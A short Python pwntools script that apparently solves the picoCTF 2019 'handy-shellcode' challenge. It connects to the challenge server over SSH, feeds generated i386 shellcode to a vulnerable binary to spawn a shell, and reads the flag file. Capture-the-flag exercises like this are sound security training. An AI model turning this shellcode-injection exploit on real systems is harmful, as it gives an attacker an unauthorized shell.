from pwn import *


def main():
    # Connect to server
    conn = ssh(host="2019shell1.picoctf.com", port=22, user="alichtman", ssh_agent=True)
    proc = conn.process("/problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/vuln")

    # Create the shellcode that will give us a shell
    shellcode = asm(shellcraft.i386.linux.sh())

    # Run the program and print the shellcode, spawning a shell
    proc.sendlineafter(":\n", shellcode)

    # Input "cat flag.txt" to the shell
    proc.sendlineafter("$ ", "cat /problems/handy-shellcode_5_d1b3658f284f442eac06607b8ac4d1f5/flag.txt")
    flag = proc.recv().decode("utf-8")
    proc.close()

    print(f"\nFLAG: {flag}")


if __name__ == "__main__":
    main()
